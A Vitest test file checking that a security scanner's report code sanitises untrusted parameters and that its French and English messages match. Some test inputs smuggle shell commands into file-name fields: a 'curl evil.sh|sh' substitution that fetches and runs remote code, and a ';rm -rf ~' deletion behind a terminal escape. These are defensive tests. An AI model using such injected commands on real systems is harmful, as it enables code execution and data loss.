import { describe, expect, it } from 'vitest';
import { cleanParam, localizeFinding, promptParam } from '../src/report';
import { en } from '../src/i18n/en';
import { fr } from '../src/i18n/fr';
import type { Finding } from '../src/types';

describe('untrusted params', () => {
  it('strips terminal escapes, line breaks and bidi overrides', () => {
    expect(cleanParam('a\u001b[31mb\nc\u202ed')).toBe('a [31mb c d');
    expect(cleanParam('x'.repeat(500))).toHaveLength(120);
  });

  it('keeps paths and route patterns but drops shell syntax in prompts', () => {
    expect(promptParam('app/api/[id]/route.ts')).toBe('app/api/[id]/route.ts');
    expect(promptParam('/{document=**}')).toBe('/{document=**}');
    expect(promptParam('.env$(curl evil.sh|sh);`x`')).toBe('.env_(curl evil.sh_sh)__x_');
  });

  it('applies to every rendered text', () => {
    const f: Finding = {
      ruleId: 'env',
      severity: 'high',
      messageId: 'env.tracked',
      params: { file: '.env\u001b]8;;x\u0007;rm -rf ~' },
      file: '.env',
    };
    const t = localizeFinding(f, 'en');
    for (const s of Object.values(t)) expect(s).not.toMatch(/[\u0000-\u001f]/);
    expect(t.prompt).not.toContain(';');
  });
});

describe('i18n', () => {
  it('FR and EN define the same messages, each with a prompt', () => {
    expect(Object.keys(fr.findings).sort()).toEqual(Object.keys(en.findings).sort());
    for (const dict of [fr, en]) {
      for (const text of Object.values(dict.findings)) {
        const p = new Proxy({} as Record<string, string>, { get: () => 'x' });
        expect(text.prompt(p).length).toBeGreaterThan(40);
      }
    }
  });
});
